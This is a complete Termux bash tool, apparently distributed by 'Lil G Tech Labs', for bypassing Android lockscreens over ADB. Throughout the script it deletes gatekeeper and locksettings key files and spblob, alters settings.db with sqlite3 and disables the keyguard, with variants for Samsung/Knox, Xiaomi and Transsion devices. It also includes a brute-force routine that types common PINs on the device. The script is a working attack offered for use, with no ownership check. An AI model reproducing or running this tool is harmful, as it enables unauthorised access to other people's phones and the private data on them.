#!/data/data/com.termux/files/usr/bin/bash

TBIN="/data/data/com.termux/files/usr/bin"
export PATH="$TBIN:/data/data/com.termux/files/usr/sbin:$PATH"
export LD_LIBRARY_PATH="/data/data/com.termux/files/usr/lib:$LD_LIBRARY_PATH"

if [ "$(id -u)" != "0" ] && [ -z "$LGTL_ROOT_INHERITED" ]; then
    exec su -c "LGTL_ROOT_INHERITED=1 $TBIN/bash $0"
    exit 1
fi
export LGTL_ROOT_INHERITED=1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
W='\033[1;37m'; GR='\033[0;37m'; M='\033[0;35m'; B='\033[1m'
DIM='\033[2m'; N='\033[0m'

ADB="$TBIN/adb"
VERSION="2.0"
LOG_DIR="/sdcard/LilGTechLabs/logs"
mkdir -p "$LOG_DIR" 2>/dev/null
LOG_FILE="$LOG_DIR/lgtl_pin_$(date +%Y%m%d_%H%M%S).log"

log()  { echo "[$(date '+%H:%M:%S')] $(printf '%s' "$1" | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE"; }
ok()   { echo -e "  ${G}[✓]${N} $1"; log "[OK] $1"; }
err()  { echo -e "  ${R}[✗]${N} $1"; log "[ERR] $1"; }
info() { echo -e "  ${C}[*]${N} $1"; log "[INFO] $1"; }
warn() { echo -e "  ${Y}[!]${N} $1"; log "[WARN] $1"; }
ask()  { printf "${W}  ➤  %s${N}" "$1"; read -r "$2"; }
div()  { echo -e "  ${GR}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"; }
pause(){ echo ""; printf "${W}  ➤  Press Enter to continue...${N}"; read -r _D; }

run_adb() { "$ADB" -H 127.0.0.1 -P 5037 "$@" 2>/dev/null; }

if ! "$ADB" -H 127.0.0.1 -P 5037 get-state &>/dev/null; then
    "$ADB" start-server &>/dev/null; sleep 1
fi

type_line() {
    local text="$1" color="${2:-$W}" delay="${3:-0.03}"
    local i=0
    while [ $i -lt ${#text} ]; do
        printf "${color}%s${N}" "${text:$i:1}"; sleep "$delay"; i=$((i+1))
    done
    printf "\n"
}

pulse_bar() {
    local label="$1" steps="${2:-30}"
    printf "  ${DIM}%-34s${N} [" "$label"
    local i=0
    while [ $i -lt $steps ]; do
        local r=$(( (i * 1103515245 + 12345) % 3 ))
        case $r in 0) printf "${G}█${N}" ;; 1) printf "${C}▓${N}" ;; 2) printf "${GR}░${N}" ;; esac
        sleep 0.018; i=$((i+1))
    done
    printf "] ${G}✔${N}\n"
}

scan_check() {
    local label="$1" result="${2:-OK}" color="${3:-$G}"
    printf "  ${C}◈${N} %-34s" "$label"
    local i=0
    while [ $i -lt 6 ]; do printf "${C}·${N}"; sleep 0.05; i=$((i+1)); done
    printf " ${color}%s${N}\n" "$result"
}

boot_anim() {
    clear; echo ""
    type_line "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$C" 0.004
    type_line "     LIL G TECH LABS  ·  PIN / Pattern Remove" "$W" 0.022
    type_line "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$C" 0.004
    echo ""
    pulse_bar "Initializing ADB bridge" 30
    pulse_bar "Loading lock bypass modules" 28
    if [ "$(id -u)" = "0" ]; then
        scan_check "Root access" "GRANTED" "$G"
    else
        scan_check "Root access" "LIMITED" "$Y"
    fi
    echo ""; sleep 0.2
}

banner() {
    clear; echo ""
    printf "  ${C}╔══════════════════════════════════════════════════╗${N}\n"
    printf "  ${C}║${N}  ${M}${B}██╗      ██████╗  ██████╗██╗  ██╗${N}             ${C}║${N}\n"
    printf "  ${C}║${N}  ${M}${B}██║     ██╔═══██╗██╔════╝██║ ██╔╝${N}             ${C}║${N}\n"
    printf "  ${C}║${N}  ${M}${B}██║     ██║   ██║██║     █████╔╝${N}  ${W}Remove${N}      ${C}║${N}\n"
    printf "  ${C}║${N}  ${M}${B}██║     ██║   ██║██║     ██╔═██╗${N}               ${C}║${N}\n"
    printf "  ${C}║${N}  ${M}${B}███████╗╚██████╔╝╚██████╗██║  ██╗${N}  ${DIM}v${VERSION}${N}        ${C}║${N}\n"
    printf "  ${C}║${N}  ${M}${B}╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝${N}  ${C}t.me/LilGTechLabs${N}  ${C}║${N}\n"
    printf "  ${C}╠══════════════════════════════════════════════════╣${N}\n"
    printf "  ${C}║${N}  ${DIM}Log:${N} ${GR}%-43s${N}${C}║${N}\n" "$LOG_FILE"
    printf "  ${C}╚══════════════════════════════════════════════════╝${N}\n"
    echo ""
}

wait_adb() {
    info "Waiting for ADB device..."
    echo -e "  ${GR}  USB Debugging must be enabled on target.${N}"
    run_adb wait-for-device 2>/dev/null
    ok "Device connected!"; echo ""
}

get_device_info() {
    DV_BRAND=$(run_adb shell getprop ro.product.brand 2>/dev/null | tr -d '\r')
    DV_MODEL=$(run_adb shell getprop ro.product.model 2>/dev/null | tr -d '\r')
    DV_ANDROID=$(run_adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
    DV_SDK=$(run_adb shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r')
    echo ""
    echo -e "  ${W}╭──────────────────────────────────────────╮${N}"
    echo -e "  │  ${C}Brand   ${GR}│${N}  ${W}${DV_BRAND}${N}  ${DIM}${DV_MODEL}${N}"
    echo -e "  │  ${C}Android ${GR}│${N}  ${G}${DV_ANDROID}${N}  ${DIM}(SDK ${DV_SDK})${N}"
    echo -e "  ${W}╰──────────────────────────────────────────╯${N}"
    echo ""
    log "Device: $DV_BRAND $DV_MODEL Android $DV_ANDROID"
}

check_lock_status() {
    banner
    echo -e "  ${C}${B}[ LOCKSCREEN STATUS CHECK ]${N}"; echo ""
    wait_adb
    get_device_info

    info "Analyzing lockscreen state..."
    echo ""

    LOCK_TYPE=$(run_adb shell settings get secure lockscreen.password_type 2>/dev/null | tr -d '\r')
    LOCK_DISABLED=$(run_adb shell settings get secure lockscreen.disabled 2>/dev/null | tr -d '\r')
    KEYGUARD=$(run_adb shell settings get global require_password_to_decrypt 2>/dev/null | tr -d '\r')
    GESTURE_KEY=$(run_adb shell "su -c 'ls /data/system/gesture.key 2>/dev/null'" 2>/dev/null | tr -d '\r')
    PASSWORD_KEY=$(run_adb shell "su -c 'ls /data/system/password.key 2>/dev/null'" 2>/dev/null | tr -d '\r')
    GK_PIN=$(run_adb shell "su -c 'ls /data/system/gatekeeper.pin.key 2>/dev/null'" 2>/dev/null | tr -d '\r')
    GK_GESTURE=$(run_adb shell "su -c 'ls /data/system/gatekeeper.gesture.key 2>/dev/null'" 2>/dev/null | tr -d '\r')
    GK_PASSWORD=$(run_adb shell "su -c 'ls /data/system/gatekeeper.password.key 2>/dev/null'" 2>/dev/null | tr -d '\r')

    echo -e "  ${W}╭──────────────────────────────────────────────╮${N}"
    echo -e "  ${W}│           LOCKSCREEN STATE                    │${N}"
    echo -e "  ${W}├──────────────────────────────────────────────┤${N}"

    case "$LOCK_TYPE" in
        65536|131072) echo -e "  │  ${C}Lock Type   ${GR}│${N}  ${G}None / Swipe${N}" ;;
        196608)       echo -e "  │  ${C}Lock Type   ${GR}│${N}  ${R}Pattern${N}" ;;
        262144)       echo -e "  │  ${C}Lock Type   ${GR}│${N}  ${R}PIN${N}" ;;
        327680|393216) echo -e "  │  ${C}Lock Type   ${GR}│${N}  ${R}Password${N}" ;;
        *)            echo -e "  │  ${C}Lock Type   ${GR}│${N}  ${Y}Unknown (${LOCK_TYPE:-not set})${N}" ;;
    esac

    if [ "$LOCK_DISABLED" = "1" ]; then
        echo -e "  │  ${C}Disabled    ${GR}│${N}  ${G}Yes — no lock active${N}"
    else
        echo -e "  │  ${C}Disabled    ${GR}│${N}  ${R}No — lock is active${N}"
    fi

    [ -n "$GESTURE_KEY" ]  && echo -e "  │  ${C}gesture.key ${GR}│${N}  ${R}EXISTS${N}" || echo -e "  │  ${C}gesture.key ${GR}│${N}  ${G}not found${N}"
    [ -n "$PASSWORD_KEY" ] && echo -e "  │  ${C}password.key${GR}│${N}  ${R}EXISTS${N}" || echo -e "  │  ${C}password.key${GR}│${N}  ${G}not found${N}"
    [ -n "$GK_PIN" ]       && echo -e "  │  ${C}gk.pin.key  ${GR}│${N}  ${R}EXISTS${N}" || echo -e "  │  ${C}gk.pin.key  ${GR}│${N}  ${G}not found${N}"
    [ -n "$GK_GESTURE" ]   && echo -e "  │  ${C}gk.gest.key ${GR}│${N}  ${R}EXISTS${N}" || echo -e "  │  ${C}gk.gest.key ${GR}│${N}  ${G}not found${N}"
    [ -n "$GK_PASSWORD" ]  && echo -e "  │  ${C}gk.pass.key ${GR}│${N}  ${R}EXISTS${N}" || echo -e "  │  ${C}gk.pass.key ${GR}│${N}  ${G}not found${N}"

    echo -e "  ${W}╰──────────────────────────────────────────────╯${N}"
    echo ""
    log "Lock status: type=$LOCK_TYPE disabled=$LOCK_DISABLED"
    pause
}

remove_via_adb() {
    banner
    echo -e "  ${G}${B}[ METHOD 1 — ADB REMOVE ]${N}"; echo ""
    warn "Requires USB Debugging enabled on target."
    warn "No data loss — only removes the lock credential."
    echo ""
    wait_adb
    get_device_info

    info "Attempting locksettings clear..."
    run_adb shell locksettings clear --old 0000 2>/dev/null
    run_adb shell locksettings clear --old 1234 2>/dev/null
    run_adb shell locksettings set-disabled true 2>/dev/null
    ok "locksettings cleared"

    info "Removing lock key files..."
    for f in /data/system/gesture.key /data/system/password.key \
              /data/system/locksettings.db /data/system/locksettings.db-wal \
              /data/system/locksettings.db-shm /data/system/gatekeeper.password.key \
              /data/system/gatekeeper.gesture.key /data/system/gatekeeper.pin.key; do
        run_adb shell "su -c 'rm -f $f'" 2>/dev/null
    done
    ok "Lock key files removed"

    info "Disabling keyguard..."
    run_adb shell settings put global require_password_to_decrypt 0 2>/dev/null
    run_adb shell settings put secure lockscreen.disabled 1 2>/dev/null
    run_adb shell settings put secure lockscreen.password_type 65536 2>/dev/null
    ok "Keyguard disabled"

    info "Resetting lock type via locksettings..."
    run_adb shell locksettings set-pin --new "" 2>/dev/null
    ok "Lock type reset"

    echo ""; div
    ok "Lockscreen removal complete. Rebooting..."
    warn "Device should boot without PIN/pattern after reboot."
    run_adb reboot
    log "PIN remove: ADB method complete"
    pause
}

remove_via_root() {
    banner
    echo -e "  ${C}${B}[ METHOD 2 — ROOT METHOD ]${N}"; echo ""
    warn "Requires root access on target device."
    warn "Most reliable — works on Android 5–14."
    echo ""
    wait_adb
    get_device_info

    info "Removing lock files via root..."
    for f in /data/system/gesture.key /data/system/password.key \
              /data/system/locksettings.db /data/system/locksettings.db-wal \
              /data/system/locksettings.db-shm /data/system/gatekeeper.password.key \
              /data/system/gatekeeper.gesture.key /data/system/gatekeeper.pin.key; do
        run_adb shell "su -c 'rm -f $f'" 2>/dev/null
    done
    run_adb shell "su -c 'rm -rf /data/system_de/0/spblob'" 2>/dev/null
    ok "All lock files removed"

    info "Resetting locksettings database..."
    run_adb shell "su -c \"sqlite3 /data/data/com.android.providers.settings/databases/settings.db \\\"UPDATE secure SET value=65536 WHERE name='lockscreen.password_type'\\\"\"" 2>/dev/null
    run_adb shell "su -c \"sqlite3 /data/data/com.android.providers.settings/databases/settings.db \\\"UPDATE secure SET value=1 WHERE name='lockscreen.disabled'\\\"\"" 2>/dev/null
    ok "Database reset"

    info "Disabling keyguard..."
    run_adb shell "su -c 'settings put secure lockscreen.disabled 1'" 2>/dev/null
    run_adb shell "su -c 'settings put global require_password_to_decrypt 0'" 2>/dev/null
    ok "Keyguard disabled"

    echo ""; div
    ok "Root removal complete. Rebooting..."
    run_adb reboot
    log "PIN remove: root method complete"
    pause
}

remove_samsung() {
    banner
    echo -e "  ${Y}${B}[ METHOD 3 — SAMSUNG ]${N}"; echo ""
    warn "Samsung devices only."
    warn "Targets Samsung-specific lock file paths + Knox."
    echo ""
    wait_adb
    get_device_info

    info "Removing Samsung lock files..."
    run_adb shell "su -c 'rm -f /data/system/gesture.key'" 2>/dev/null
    run_adb shell "su -c 'rm -f /data/system/password.key'" 2>/dev/null
    run_adb shell "su -c 'rm -f /data/system/locksettings.db*'" 2>/dev/null
    run_adb shell "su -c 'rm -rf /efs/lockscreen'" 2>/dev/null
    run_adb shell "su -c 'rm -rf /data/system/users/0/*.key'" 2>/dev/null
    run_adb shell "su -c 'rm -rf /data/system_de/0/spblob'" 2>/dev/null
    ok "Samsung lock files removed"

    info "Clearing Knox lockscreen..."
    run_adb shell "pm clear com.samsung.android.knox.analytics.uploader" 2>/dev/null
    run_adb shell "settings put secure lockscreen.disabled 1" 2>/dev/null
    run_adb shell "settings put global require_password_to_decrypt 0" 2>/dev/null
    ok "Knox lockscreen cleared"

    info "Resetting lock via locksettings..."
    run_adb shell "su -c 'locksettings set-disabled true'" 2>/dev/null
    ok "locksettings disabled"

    echo ""; div
    ok "Samsung removal complete. Rebooting..."
    run_adb reboot
    log "PIN remove: Samsung method complete"
    pause
}

remove_xiaomi() {
    banner
    echo -e "  ${Y}${B}[ METHOD 4 — XIAOMI / MIUI ]${N}"; echo ""
    warn "Xiaomi / Redmi / POCO devices only."
    echo ""
    wait_adb
    get_device_info

    info "Removing MIUI lock files..."
    for f in /data/system/gesture.key /data/system/password.key \
              /data/system/locksettings.db /data/system/locksettings.db-wal \
              /data/system/locksettings.db-shm /data/system/gatekeeper.password.key \
              /data/system/gatekeeper.gesture.key /data/system/gatekeeper.pin.key; do
        run_adb shell "su -c 'rm -f $f'" 2>/dev/null
    done
    run_adb shell "su -c 'rm -rf /data/system_de/0/spblob'" 2>/dev/null
    ok "MIUI lock files removed"

    info "Resetting MIUI security settings..."
    run_adb shell "su -c 'settings put secure lockscreen.disabled 1'" 2>/dev/null
    run_adb shell "su -c 'settings put global require_password_to_decrypt 0'" 2>/dev/null
    run_adb shell "su -c 'settings put secure lockscreen.password_type 65536'" 2>/dev/null
    ok "MIUI security settings reset"

    info "Clearing MIUI Guard Provider..."
    run_adb shell "pm clear com.miui.guardprovider" 2>/dev/null
    ok "Guard Provider cleared"

    echo ""; div
    ok "Xiaomi removal complete. Rebooting..."
    run_adb reboot
    log "PIN remove: Xiaomi method complete"
    pause
}

remove_transsion() {
    banner
    echo -e "  ${C}${B}[ METHOD 5 — TRANSSION (XOS) ]${N}"; echo ""
    warn "Infinix / Tecno / Itel devices only."
    echo ""
    wait_adb
    get_device_info

    info "Removing XOS lock files..."
    for f in /data/system/gesture.key /data/system/password.key \
              /data/system/locksettings.db /data/system/locksettings.db-wal \
              /data/system/locksettings.db-shm /data/system/gatekeeper.password.key \
              /data/system/gatekeeper.gesture.key /data/system/gatekeeper.pin.key; do
        run_adb shell "su -c 'rm -f $f'" 2>/dev/null
    done
    run_adb shell "su -c 'rm -rf /data/system_de/0/spblob'" 2>/dev/null
    ok "XOS lock files removed"

    info "Resetting XOS lockscreen settings..."
    run_adb shell "su -c 'settings put secure lockscreen.disabled 1'" 2>/dev/null
    run_adb shell "su -c 'settings put global require_password_to_decrypt 0'" 2>/dev/null
    run_adb shell "su -c 'locksettings set-disabled true'" 2>/dev/null
    ok "XOS lockscreen reset"

    info "Clearing Transsion security provider..."
    run_adb shell "pm clear com.transsion.phonemanager" 2>/dev/null
    ok "Security provider cleared"

    echo ""; div
    ok "Transsion removal complete. Rebooting..."
    run_adb reboot
    log "PIN remove: Transsion method complete"
    pause
}

brute_force_pin() {
    banner
    echo -e "  ${R}${B}[ METHOD 6 — PIN BRUTE FORCE (ADB) ]${N}"; echo ""
    warn "Attempts common PINs via ADB input commands."
    warn "Requires USB Debugging + screen on + unlocked by ADB."
    warn "Device may lock after multiple failures on Android 10+."
    echo ""
    printf "  ${W}  ➤  Continue? (y/N):${N} "; read -r _BF
    [ "$_BF" = "y" ] || [ "$_BF" = "Y" ] || { warn "Aborted."; pause; return; }

    wait_adb
    get_device_info

    COMMON_PINS="0000 1111 1234 0001 1212 2580 0852 1357 2468 9999 8888 7777 6666 5555 4444 3333 2222 1122 1100 0011 1010 0101 2020 2021 2022 2023 1990 2000 0420 0123"

    info "Waking up device..."
    run_adb shell input keyevent 26 2>/dev/null
    sleep 1
    run_adb shell input swipe 540 1800 540 900 2>/dev/null
    sleep 1

    ok "Starting PIN brute force..."
    echo ""
    FOUND=false
    for pin in $COMMON_PINS; do
        printf "  ${C}[→]${N} Trying PIN: ${W}%s${N}\r" "$pin"
        run_adb shell input text "$pin" 2>/dev/null
        run_adb shell input keyevent 66 2>/dev/null
        sleep 1.2
        LOCK_STATE=$(run_adb shell dumpsys window 2>/dev/null | grep "mShowingLockscreen" | head -1)
        if echo "$LOCK_STATE" | grep -q "false"; then
            echo ""
            ok "PIN FOUND: ${G}${B}${pin}${N}"
            FOUND=true
            log "Brute force PIN found: $pin"
            break
        fi
    done

    echo ""
    if [ "$FOUND" = "false" ]; then
        warn "Common PINs exhausted. PIN not found in list."
        warn "Try the manual removal methods instead."
        log "Brute force: PIN not found"
    fi
    pause
}

view_log() {
    banner
    echo -e "  ${W}${B}[ SESSION LOG ]${N}"; echo ""
    if [ ! -f "$LOG_FILE" ]; then
        warn "No log file found."
    else
        div
        tail -50 "$LOG_FILE" | while IFS= read -r line; do
            echo -e "  ${DIM}$line${N}"
        done
        div
    fi
    pause
}

main_menu() {
    boot_anim
    while true; do
        banner
        echo -e "  ${W}${B}  ◈  SELECT METHOD  ◈${N}"
        echo -e "  ${GR}┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄${N}"
        echo ""
        echo -e "  ${C}[0]${N}  ${W}Lock Status Check${N}      ${DIM}analyze device lockscreen state${N}"
        echo ""
        echo -e "  ${G}[1]${N}  ${W}ADB Method${N}             ${DIM}all brands · no root needed${N}"
        echo -e "  ${C}[2]${N}  ${W}Root Method${N}            ${DIM}most reliable · needs root${N}"
        echo -e "  ${Y}[3]${N}  ${W}Samsung Method${N}         ${DIM}Samsung · Knox specific${N}"
        echo -e "  ${Y}[4]${N}  ${W}Xiaomi / MIUI${N}          ${DIM}Xiaomi · Redmi · POCO${N}"
        echo -e "  ${C}[5]${N}  ${W}Transsion / XOS${N}        ${DIM}Infinix · Tecno · Itel${N}"
        echo -e "  ${R}[6]${N}  ${W}PIN Brute Force${N}        ${DIM}common PINs via ADB input${N}"
        echo ""
        echo -e "  ${GR}[L]${N}  View Log"
        echo -e "  ${GR}[X]${N}  Exit"
        echo ""
        div
        ask "Choose: " CHOICE; echo ""
        log "Menu: $CHOICE"
        case "$CHOICE" in
            0) check_lock_status ;;
            1) remove_via_adb ;;
            2) remove_via_root ;;
            3) remove_samsung ;;
            4) remove_xiaomi ;;
            5) remove_transsion ;;
            6) brute_force_pin ;;
            [Ll]) view_log ;;
            [Xx]) echo ""; type_line "  Stay modding. — Lil G Tech Labs" "$GR" 0.03; echo ""; exit 0 ;;
            *) warn "Invalid option." ;;
        esac
    done
}

main_menu
